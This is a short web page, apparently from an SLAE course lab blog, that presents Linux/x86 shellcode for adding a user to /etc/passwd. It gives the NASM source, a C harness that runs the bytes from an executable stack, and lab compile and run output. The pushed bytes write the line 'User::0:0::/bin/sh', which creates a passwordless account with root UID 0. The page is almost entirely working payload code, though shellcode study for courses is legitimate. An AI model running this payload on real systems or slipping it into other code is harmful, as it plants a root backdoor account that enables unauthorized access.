---
permalink: /adduser/
layout: single
classes: wide

--- 
```nasm
; Exploit Title: Linux/x86 - adduser 'User' to /etc/passwd ShellCode (74 bytes)
; Date: 2019-10-12
; Author: bolonobolo
; Vendor Homepage: None
; Software Link: None
; Tested on: Linux x86
; Comments: add user "User" to /etc/passwd
; CVE: N/A

global _start			

section .text
_start:
	xor ebx,ebx
	xor ecx,ecx
	mov cx,0x401
	mul ebx
	push ebx
	push dword 0x64777373
	push dword 0x61702f63
	push dword 0x74652f2f
	lea ebx,[esp]
	mov al,0x5
	int 0x80
	xchg eax,ebx
	mul edx
	push dword 0x68732f6e
	push dword 0x69622f3a
	push dword 0x2f3a3a30
	push dword 0x3a303a3a
	push dword 0x72657355
	lea ecx,[esp]
	mov dl,0x14
	mov al,0x4
	int 0x80
	sub al,0x13
	int 0x80
```

```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\x31\xc9\x66\xb9\x01\x04\xf7\xe3\x53"
"\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68"
"\x2f\x2f\x65\x74\x8d\x1c\x24\xb0\x05\xcd\x80"
"\x93\xf7\xe2\x68\x6e\x2f\x73\x68\x68\x3a\x2f"
"\x62\x69\x68\x30\x3a\x3a\x2f\x68\x3a\x3a\x30"
"\x3a\x68\x55\x73\x65\x72\x8d\x0c\x24\xb2\x14"
"\xb0\x04\xcd\x80\x2c\x13\xcd\x80";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
```bash
root@slae32-lab:# gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
root@slae32-lab:# ./shellcode 
Shellcode Length:  74
```
            